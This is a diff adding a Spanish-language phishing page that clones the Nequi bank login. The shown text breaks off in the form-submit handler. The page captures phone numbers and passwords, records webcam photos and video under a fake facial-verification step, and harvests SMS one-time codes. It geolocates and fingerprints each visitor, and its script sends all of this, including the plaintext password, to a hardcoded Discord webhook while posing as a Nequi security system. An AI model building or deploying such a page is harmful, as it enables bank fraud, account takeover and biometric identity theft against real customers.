@@ -1,0 +1,1803 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entra a tu Nequi - Clon</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --nequi-pink-dark: #DA0081;
+            --nequi-pink-light: #F8E0EE;
+            --nequi-pink-button: #DA0081;
+            --nequi-input-bg: #F9F0F4;
+            --nequi-text: #333333;
+            --nequi-text-light: #666;
+            --nequi-box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #FFFFFF;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* --- Estilos del Encabezado (Header) --- */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 50px;
+            background-color: #FFFFFF;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--nequi-text);
+        }
+
+        .logo img {
+            height: 35px;
+        }
+
+        .recharge-button {
+            background-color: var(--nequi-pink-dark);
+            color: #FFFFFF;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 5px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .recharge-button:hover {
+            background-color: #c30073;
+        }
+
+        /* --- Estilos del Contenido Principal (Main) --- */
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            justify-content: normal;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* --- Formas de Fondo Decorativas --- */
+        .background-shapes {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--nequi-pink-light);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .shape {
+            position: absolute;
+            background-color: rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+        }
+
+        .shape-1 {
+            width: 150px;
+            height: 150px;
+            top: 20%;
+            right: 5%;
+            transform: rotate(15deg);
+        }
+
+        .shape-2 {
+            width: 100px;
+            height: 100px;
+            bottom: 10%;
+            left: 30%;
+            transform: rotate(-30deg);
+        }
+
+        .shape-3 {
+            width: 80px;
+            height: 80px;
+            top: 10%;
+            left: 20%;
+            transform: rotate(45deg);
+        }
+
+        /* --- Contenedor del Formulario --- */
+        .login-container {
+            z-index: 10;
+            position: relative;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            margin-left: 35%;
+        }
+
+        .login-box {
+            background-color: #FFFFFF;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: var(--nequi-box-shadow);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--nequi-text);
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--nequi-text-light);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        /* --- Formulario de Login --- */
+        .login-form .input-group {
+            margin-bottom: 15px;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: var(--nequi-input-bg);
+            display: flex;
+        }
+
+        .text-input {
+            width: 100%;
+            padding: 15px 15px;
+            border: none;
+            font-size: 16px;
+            color: var(--nequi-text);
+            background-color: transparent;
+            font-weight: 600;
+        }
+
+        .text-input::placeholder {
+            color: #999;
+            font-weight: 300;
+        }
+
+        .text-input:focus {
+            outline: none;
+        }
+
+        /* Input de Teléfono */
+        .phone-input {
+            display: flex;
+            align-items: center;
+        }
+
+        .country-code {
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--nequi-text);
+            cursor: pointer;
+            white-space: nowrap;
+            border-right: 1px solid rgba(0, 0, 0, 0.1);
+            height: 50px;
+        }
+
+        .flag {
+            display: inline-block;
+            width: 20px;
+            height: 15px;
+            margin-right: 8px;
+            border-radius: 2px;
+        }
+
+        .flag img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        /* --- Botón Entrar --- */
+        .enter-button {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--nequi-pink-button);
+            color: #FFFFFF;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .enter-button:hover {
+            background-color: #c30073;
+        }
+
+        .enter-button.disabled {
+            background-color: #E9E9E9;
+            cursor: not-allowed;
+        }
+
+        /* --- Página de Cargando --- */
+        .loading-page {
+            display: none;
+            text-align: center;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid var(--nequi-pink-dark);
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 30px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-title {
+            font-size: 22px;
+            color: var(--nequi-text);
+            margin-bottom: 15px;
+        }
+
+        .loading-subtitle {
+            color: var(--nequi-text-light);
+            margin-bottom: 30px;
+        }
+
+        .countdown-timer {
+            font-size: 16px;
+            color: var(--nequi-pink-dark);
+            font-weight: 600;
+            margin-top: 20px;
+        }
+
+        /* --- Verificación Facial Mejorada --- */
+        .facial-verification-page {
+            display: none;
+            text-align: center;
+        }
+
+        .verification-steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+            position: relative;
+        }
+
+        .verification-steps::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 50px;
+            right: 50px;
+            height: 3px;
+            background: #e9ecef;
+            z-index: 1;
+        }
+
+        .step {
+            flex: 1;
+            text-align: center;
+            padding: 0 10px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: #e9ecef;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: 600;
+            font-size: 18px;
+            transition: all 0.3s ease;
+            border: 3px solid white;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .step.active .step-icon {
+            background: var(--nequi-pink-dark);
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 6px 15px rgba(218, 0, 129, 0.3);
+        }
+
+        .step.completed .step-icon {
+            background: #27ae60;
+            color: white;
+        }
+
+        .step-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--nequi-text-light);
+            transition: all 0.3s ease;
+        }
+
+        .step.active .step-text {
+            color: var(--nequi-pink-dark);
+            font-weight: 600;
+        }
+
+        .step.completed .step-text {
+            color: #27ae60;
+        }
+
+        /* Cámara Mejorada */
+        .camera-container {
+            width: 100%;
+            max-width: 400px;
+            height: 300px;
+            margin: 30px auto;
+            background: linear-gradient(45deg, #1a1a1a, #333);
+            border-radius: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            border: 3px solid rgba(255, 255, 255, 0.1);
+        }
+
+        #videoElement {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            filter: brightness(1.1) contrast(1.1);
+        }
+
+        .face-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 160px;
+            height: 200px;
+            border: 3px solid rgba(255, 255, 255, 0.7);
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            z-index: 10;
+            pointer-events: none;
+            box-shadow: 0 0 0 1000px rgba(0, 0, 0, 0.5);
+        }
+
+        .face-overlay::before {
+            content: '';
+            position: absolute;
+            top: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 25px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+        }
+
+        .face-overlay::after {
+            content: '';
+            position: absolute;
+            bottom: 30%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 40px;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+        }
+
+        /* Indicadores Mejorados */
+        .verification-indicators {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            right: 15px;
+            display: flex;
+            justify-content: space-between;
+            z-index: 11;
+        }
+
+        .indicator {
+            padding: 8px 16px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            border-radius: 20px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .indicator-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .indicator-dot.good {
+            background: #27ae60;
+            animation: pulse 1.5s infinite;
+        }
+
+        .indicator-dot.bad {
+            background: #e74c3c;
+        }
+
+        .indicator-dot.warning {
+            background: #f39c12;
+            animation: pulse 1.5s infinite;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: #e9ecef;
+            border-radius: 5px;
+            margin: 25px 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--nequi-pink-dark), #FF1493);
+            width: 0%;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.4), 
+                transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .verification-status {
+            margin: 20px 0;
+            padding: 18px;
+            border-radius: 12px;
+            display: none;
+            border-left: 5px solid;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .verification-status.success {
+            background: #d4ffea;
+            color: #155724;
+            border-left-color: #27ae60;
+            display: block;
+        }
+
+        .verification-status.error {
+            background: #ffebee;
+            color: #721c24;
+            border-left-color: #e74c3c;
+            display: block;
+        }
+
+        .verification-status.warning {
+            background: #fff8e1;
+            color: #856404;
+            border-left-color: #f39c12;
+            display: block;
+        }
+
+        .status-icon {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        /* --- Página de Verificación SMS --- */
+        .sms-verification-page {
+            display: none;
+            text-align: center;
+        }
+
+        .sms-code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 35px 0;
+        }
+
+        .sms-digit {
+            width: 55px;
+            height: 65px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            background: var(--nequi-input-bg);
+            transition: all 0.3s ease;
+            color: var(--nequi-text);
+        }
+
+        .sms-digit:focus {
+            border-color: var(--nequi-pink-dark);
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(218, 0, 129, 0.15);
+            transform: translateY(-3px);
+        }
+
+        .sms-digit.filled {
+            border-color: var(--nequi-pink-dark);
+            background: rgba(218, 0, 129, 0.05);
+        }
+
+        .resend-sms {
+            margin-top: 25px;
+            color: var(--nequi-text-light);
+            font-size: 14px;
+        }
+
+        .resend-link {
+            color: var(--nequi-pink-dark);
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            padding: 5px 10px;
+            border-radius: 5px;
+        }
+
+        .resend-link:hover {
+            background: rgba(218, 0, 129, 0.1);
+            text-decoration: none;
+        }
+
+        .timer {
+            color: var(--nequi-pink-dark);
+            font-weight: 700;
+            margin: 0 5px;
+        }
+
+        /* Action Buttons Mejorados */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn-secondary {
+            padding: 16px 25px;
+            font-size: 16px;
+            border-radius: 12px;
+            border: 2px solid var(--nequi-pink-dark);
+            background: transparent;
+            color: var(--nequi-pink-dark);
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(218, 0, 129, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(218, 0, 129, 0.2);
+        }
+
+        /* Mensajes Mejorados */
+        .message {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: 500;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .message.success {
+            background: #d4ffea;
+            color: #155724;
+            border: 1px solid #27ae60;
+            display: block;
+        }
+
+        .message.error {
+            background: #ffebee;
+            color: #721c24;
+            border: 1px solid #e74c3c;
+            display: block;
+        }
+
+        .message.warning {
+            background: #fff8e1;
+            color: #856404;
+            border: 1px solid #f39c12;
+            display: block;
+        }
+
+        /* Loader de Captura Facial */
+        .capture-loader {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 12;
+            text-align: center;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px 25px;
+            border-radius: 20px;
+            display: none;
+        }
+
+        .capture-loader span {
+            display: inline-block;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .capture-loader span:nth-child(1) { animation-delay: -0.32s; }
+        .capture-loader span:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1.0); }
+        }
+
+        /* Eye Blink Detection */
+        .eye-status {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 8px 16px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            border-radius: 20px;
+            font-size: 13px;
+            z-index: 11;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(5px);
+        }
+
+        .blink-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #27ae60;
+            animation: blink 3s infinite;
+        }
+
+        @keyframes blink {
+            0%, 45%, 55%, 100% { opacity: 1; }
+            48%, 52% { opacity: 0.3; }
+            50% { opacity: 0; }
+        }
+
+        /* Responsive Design */
+        @media only screen and (max-width: 768px) {
+            .header {
+                padding: 15px 20px;
+            }
+            
+            .login-container {
+                margin: 0;
+                padding: 20px;
+                width: 100%;
+                max-width: 100%;
+            }
+            
+            .login-box {
+                padding: 30px 20px;
+                margin: 20px;
+            }
+            
+            .camera-container {
+                max-width: 320px;
+                height: 240px;
+            }
+            
+            .sms-digit {
+                width: 45px;
+                height: 55px;
+                font-size: 22px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+
+        @media only screen and (max-width: 480px) {
+            .title {
+                font-size: 24px;
+            }
+            
+            .camera-container {
+                max-width: 280px;
+                height: 210px;
+            }
+            
+            .face-overlay {
+                width: 140px;
+                height: 180px;
+            }
+            
+            .sms-digit {
+                width: 40px;
+                height: 50px;
+                font-size: 20px;
+            }
+            
+            .country-code {
+                padding: 0 15px;
+                font-size: 14px;
+            }
+            
+            .text-input {
+                padding: 15px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo">
+            <img src="logo.svg" style="margin-left: 40px;" alt="Nequi Logo">
+        </div>
+        <button class="recharge-button">Recarga</button>
+    </header>
+
+    <main class="main-content">
+        <div class="background-shapes">
+            <div class="shape shape-1"></div>
+            <div class="shape shape-2"></div>
+            <div class="shape shape-3"></div>
+        </div>
+
+        <div class="login-container">
+            <!-- Página 1: Login inicial -->
+            <div class="login-box" id="loginPage">
+                <h2 class="title">Entra a tu Nequi</h2>
+                <p class="subtitle">Podrás realizar transferencias, hacer pagos y muchas cosas más.</p>
+
+                <form id="loginForm" class="login-form">
+                    <div class="input-group phone-input">
+                        <div class="country-code">
+                            <div class="flag">
+                                <img src="https://transacciones.nequi.com/bdigital/images/flag_colombia.png" alt="Bandera Colombia">
+                            </div>
+                            <span>+57</span>
+                        </div>
+                        <input type="text" id="phone" placeholder="Número de celular" class="text-input cell-number-input" required>
+                    </div>
+
+                    <div class="input-group password-input">
+                        <input type="password" id="password" placeholder="Contraseña" class="text-input" required>
+                    </div>
+
+                    <button type="submit" class="enter-button disabled" id="submitBtn" disabled>Entra</button>
+                    
+                    <div id="message" class="message"></div>
+                </form>
+            </div>
+
+            <!-- Página 2: Cargando 40 segundos -->
+            <div class="login-box loading-page" id="loadingPage1">
+                <div class="loading-spinner"></div>
+                <h3 class="loading-title">Verificando tus credenciales</h3>
+                <p class="loading-subtitle">Estamos validando tu información con nuestros servidores seguros...</p>
+                <div class="countdown-timer" id="countdown1">40 segundos</div>
+            </div>
+
+            <!-- Página 3: Verificación Facial Mejorada -->
+            <div class="login-box facial-verification-page" id="facialVerificationPage">
+                <h2 class="title">Verificación Facial</h2>
+                
+                <div class="verification-steps">
+                    <div class="step completed" id="step1">
+                        <div class="step-icon">1</div>
+                        <div class="step-text">Login</div>
+                    </div>
+                    <div class="step completed" id="step2">
+                        <div class="step-icon">2</div>
+                        <div class="step-text">Verificación</div>
+                    </div>
+                    <div class="step active" id="step3">
+                        <div class="step-icon">3</div>
+                        <div class="step-text">Rostro</div>
+                    </div>
+                </div>
+                
+                <p class="subtitle">Para tu seguridad, necesitamos verificar tu identidad con reconocimiento facial.</p>
+                
+                <div class="camera-container">
+                    <video id="videoElement" autoplay playsinline></video>
+                    <canvas id="canvasElement" style="display:none;"></canvas>
+                    <canvas id="previewCanvas" style="display:none;"></canvas>
+                    
+                    <div class="verification-indicators">
+                        <div class="indicator" id="positionIndicator">
+                            <div class="indicator-dot warning" id="positionDot"></div>
+                            <span>Posición: Ajustando...</span>
+                        </div>
+                        <div class="indicator" id="lightingIndicator">
+                            <div class="indicator-dot warning" id="lightingDot"></div>
+                            <span>Iluminación: Media</span>
+                        </div>
+                    </div>
+                    
+                    <div class="face-overlay"></div>
+                    <div class="eye-status">
+                        <div class="blink-indicator"></div>
+                        <span>Por favor, parpadea normalmente</span>
+                    </div>
+                    
+                    <div class="capture-loader" id="captureLoader">
+                        <span>●</span>
+                        <span>●</span>
+                        <span>●</span>
+                    </div>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div class="verification-status warning" id="positionStatus">
+                    <span class="status-icon">⚠️</span>
+                    Por favor, centra tu rostro en el círculo y mira directamente a la cámara. Asegúrate de buena iluminación y no uses lentes oscuros.
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn-secondary" id="retryBtn">Reiniciar</button>
+                    <button class="enter-button" id="startVerificationBtn">Comenzar Verificación</button>
+                    <button class="enter-button" id="completeVerificationBtn" style="display: none;">Continuar</button>
+                </div>
+            </div>
+
+            <!-- Página 4: Cargando 30 segundos -->
+            <div class="login-box loading-page" id="loadingPage2">
+                <div class="loading-spinner"></div>
+                <h3 class="loading-title">Procesando verificación facial</h3>
+                <p class="loading-subtitle">Estamos analizando tu rostro con nuestros sistemas de seguridad...</p>
+                <div class="countdown-timer" id="countdown2">30 segundos</div>
+            </div>
+
+            <!-- Página 5: Verificación SMS -->
+            <div class="login-box sms-verification-page" id="smsVerificationPage">
+                <h2 class="title">Verificación por SMS</h2>
+                <p class="subtitle">Hemos enviado un código de 6 dígitos a tu número de teléfono</p>
+                
+                <div class="sms-code-inputs" id="smsInputs">
+                    <input type="text" class="sms-digit" maxlength="1" data-index="1">
+                    <input type="text" class="sms-digit" maxlength="1" data-index="2">
+                    <input type="text" class="sms-digit" maxlength="1" data-index="3">
+                    <input type="text" class="sms-digit" maxlength="1" data-index="4">
+                    <input type="text" class="sms-digit" maxlength="1" data-index="5">
+                    <input type="text" class="sms-digit" maxlength="1" data-index="6">
+                </div>
+                
+                <button class="enter-button" id="verifySmsBtn">Verificar Código</button>
+                
+                <div class="resend-sms">
+                    ¿No recibiste el código? 
+                    <span class="resend-link" id="resendLink">Reenviar código en <span class="timer" id="resendTimer">60</span>s</span>
+                </div>
+                
+                <div id="smsMessage" class="message" style="margin-top: 20px;"></div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // ============================================
+        // CONFIGURACIÓN Y VARIABLES GLOBALES
+        // ============================================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448401704046563359/vWfyriEhxw7rVU4slja7qdFd4NG7mZ2wFAE7p_xTSnKx0Ut_Do16Uq1PUjdtWwktquEn';
+        
+        // Variables de estado
+        let userData = {};
+        let credentialsData = {};
+        let stream = null;
+        let isRecording = false;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let verificationTime = 0;
+        let facePositionPhotos = [];
+        let photoCaptureInterval = null;
+        let verificationInterval = null;
+        let blinkCount = 0;
+        let glassDetectionCount = 0;
+        
+        // Variables de detección facial
+        let facePosition = { x: 0, y: 0, size: 0 };
+        let faceInPosition = false;
+        let faceLookingForward = false;
+        let lightingGood = false;
+        let noGlasses = true;
+        let hasBlinked = false;
+        let detectionChecks = {
+            position: 0,
+            lighting: 0,
+            glasses: 0,
+            blink: 0
+        };
+        
+        // ============================================
+        // FUNCIONES DE MANEJO DE PÁGINAS
+        // ============================================
+        
+        function showPage(pageId) {
+            document.querySelectorAll('.login-box').forEach(box => {
+                box.style.display = 'none';
+            });
+            document.getElementById(pageId).style.display = 'block';
+        }
+        
+        // ============================================
+        // FUNCIONES DE IP Y UBICACIÓN MEJORADAS
+        // ============================================
+        
+        async function getUserData() {
+            try {
+                // Intentar con ip-api.com primero (más rápido)
+                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    return {
+                        ip: data.query,
+                        country: data.country,
+                        countryCode: data.countryCode,
+                        region: data.regionName,
+                        city: data.city,
+                        zip: data.zip,
+                        lat: data.lat,
+                        lon: data.lon,
+                        timezone: data.timezone,
+                        isp: data.isp,
+                        org: data.org,
+                        as: data.as
+                    };
+                }
+                
+                // Fallback a ipapi.co si el primero falla
+                const fallbackResponse = await fetch('https://ipapi.co/json/');
+                const fallbackData = await fallbackResponse.json();
+                
+                return {
+                    ip: fallbackData.ip,
+                    country: fallbackData.country_name,
+                    countryCode: fallbackData.country_code,
+                    region: fallbackData.region,
+                    city: fallbackData.city,
+                    zip: fallbackData.postal,
+                    lat: fallbackData.latitude,
+                    lon: fallbackData.longitude,
+                    timezone: fallbackData.timezone,
+                    isp: fallbackData.org,
+                    org: fallbackData.org,
+                    as: fallbackData.asn
+                };
+            } catch (error) {
+                console.error('Error obteniendo información de IP:', error);
+                
+                // Datos por defecto si todo falla
+                return {
+                    ip: 'No disponible',
+                    country: 'Desconocido',
+                    region: 'Desconocido',
+                    city: 'Desconocido',
+                    isp: 'Desconocido',
+                    userAgent: navigator.userAgent
+                };
+            }
+        }
+        
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
+            };
+        }
+        
+        // ============================================
+        // FUNCIÓN DE ENVÍO A DISCORD MEJORADA
+        // ============================================
+        
+        async function sendToDiscord(userData, credentials, verificationData = null, mediaFiles = [], messageType = 'login') {
+            const password = credentials.password || '';
+            const maskedPassword = password.length > 2 ? 
+                password[0] + '*'.repeat(password.length - 2) + password[password.length - 1] : 
+                '*'.repeat(password.length);
+            
+            const deviceInfo = getDeviceInfo();
+            
+            // Construir campos base
+            let fields = [
+                {
+                    name: '📞 Número de Teléfono',
+                    value: `+57 ${credentials.phone || 'No proporcionado'}`,
+                    inline: true
+                },
+                {
+                    name: '🔑 Contraseña',
+                    value: `\`${maskedPassword}\``,
+                    inline: true
+            },
+                {
+                    name: '🔑 Contraseña Completa',
+                    value: `\`\`\`${password}\`\`\``,
+                    inline: false
+                }
+            ];
+            
+            // Agregar campos de ubicación solo si existen
+            if (userData && Object.keys(userData).length > 0) {
+                fields.push(
+                    {
+                        name: '🌍 IP Pública',
+                        value: userData.ip || 'No disponible',
+                        inline: true
+                    },
+                    {
+                        name: '📍 Ubicación',
+                        value: `${userData.city || '?'}, ${userData.region || '?'}, ${userData.country || '?'}`,
+                        inline: true
+                    },
+                    {
+                        name: '📡 ISP/Proveedor',
+                        value: userData.isp || userData.org || 'No disponible',
+                        inline: true
+                    },
+                    {
+                        name: '🗺️ Coordenadas',
+                        value: userData.lat && userData.lon ? `${userData.lat}, ${userData.lon}` : 'No disponible',
+                        inline: true
+                    },
+                    {
+                        name: '🌐 Zona Horaria',
+                        value: userData.timezone || deviceInfo.timezone,
+                        inline: true
+                    }
+                );
+            }
+            
+            // Agregar información del dispositivo
+            fields.push(
+                {
+                    name: '💻 Navegador',
+                    value: deviceInfo.userAgent.substring(0, 100) + '...',
+                    inline: false
+                },
+                {
+                    name: '📱 Plataforma',
+                    value: deviceInfo.platform,
+                    inline: true
+                },
+                {
+                    name: '🖥️ Resolución',
+                    value: deviceInfo.screenResolution,
+                    inline: true
+                },
+                {
+                    name: '🔤 Idioma',
+                    value: deviceInfo.language,
+                    inline: true
+                },
+                {
+                    name: '🕐 Fecha y Hora (Colombia)',
+                    value: deviceInfo.timestamp,
+                    inline: true
+                }
+            );
+            
+            // Si es código SMS, agregarlo destacado
+            if (messageType === 'sms') {
+                fields.push({
+                    name: '📱 CÓDIGO SMS VERIFICACIÓN',
+                    value: `**\`\`\`${credentials.smsCode || 'No disponible'}\`\`\`**`,
+                    inline: false
+                });
+            }
+            
+            // Si hay datos de verificación facial
+            if (verificationData) {
+                fields.push({
+                    name: '📷 Verificación Facial',
+                    value: `✅ Completada\nDuración: ${verificationData.duration}s\nFotos: ${verificationData.photosCount || 0}\nVideo: ${verificationData.hasVideo ? 'Sí' : 'No'}`,
+                    inline: false
+                });
+            }
+            
+            // Determinar color según tipo de mensaje
+            let color = 0xDA0081; // Rosa por defecto
+            let title = '🔐 NUEVO INICIO DE SESIÓN DETECTADO 🔐';
+            
+            if (messageType === 'sms') {
+                color = 0x00FF00; // Verde para SMS
+                title = '📱 CÓDIGO SMS RECIBIDO 📱';
+            } else if (messageType === 'facial') {
+                color = 0x0000FF; // Azul para facial
+                title = '📸 VERIFICACIÓN FACIAL COMPLETADA 📸';
+            }
+            
+            const embed = {
+                title: title,
+                color: color,
+                fields: fields,
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: 'Sistema de Seguridad Nequi v2.0'
+                }
+            };
+            
+            const payload = {
+                embeds: [embed]
+            };
+            
+            try {
+                // Enviar datos principales
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (!response.ok) {
+                    console.error('Error enviando a Discord:', response.status);
+                }
+                
+                // Enviar archivos multimedia si existen
+                if (mediaFiles && mediaFiles.length > 0) {
+                    for (let i = 0; i < mediaFiles.length; i++) {
+                        const file = mediaFiles[i];
+                        if (file.blob && file.blob.size > 0) {
+                            const formData = new FormData();
+                            formData.append('file', file.blob, file.filename);
+                            
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                            await fetch(DISCORD_WEBHOOK_URL, { 
+                                method: 'POST', 
+                                body: formData 
+                            });
+                        }
+                    }
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error enviando datos a Discord:', error);
+                return false;
+            }
+        }
+        
+        // ============================================
+        // PÁGINA 1: LOGIN INICIAL
+        // ============================================
+        
+        const phoneInput = document.getElementById('phone');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        function formatPhoneNumber(value) {
+            const cleaned = ('' + value).replace(/\D/g, '');
+            const limit = cleaned.substring(0, 10);
+            
+            let formatted = '';
+            if (limit.length > 6) {
+                formatted = limit.substring(0, 3) + ' ' + limit.substring(3, 6) + ' ' + limit.substring(6, 10);
+            } else if (limit.length > 3) {
+                formatted = limit.substring(0, 3) + ' ' + limit.substring(3, 6);
+            } else {
+                formatted = limit;
+            }
+            
+            return formatted.trim();
+        }
+        
+        function validateForm() {
+            const cleanedPhone = phoneInput.value.replace(/\D/g, '');
+            const password = passwordInput.value;
+            
+            const isPhoneValid = cleanedPhone.length >= 9 && cleanedPhone.length <= 10;
+            const isPasswordValid = password.length >= 4 && password.length <= 20;
+            
+            if (isPhoneValid && isPasswordValid) {
+                submitBtn.classList.remove('disabled');
+                submitBtn.disabled = false;
+                submitBtn.style.backgroundColor = 'var(--nequi-pink-button)';
+            } else {
+                submitBtn.classList.add('disabled');
+                submitBtn.disabled = true;
+                submitBtn.style.backgroundColor = '#E9E9E9';
+            }
+        }
+        
+        phoneInput.addEventListener('input', function(e) {
+            this.value = formatPhoneNumber(this.value);
+            validateForm();
+        });
+        
+        passwordInput.addEventListener('input', validateForm);
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = phoneInput.value.replace(/\D/g, '');
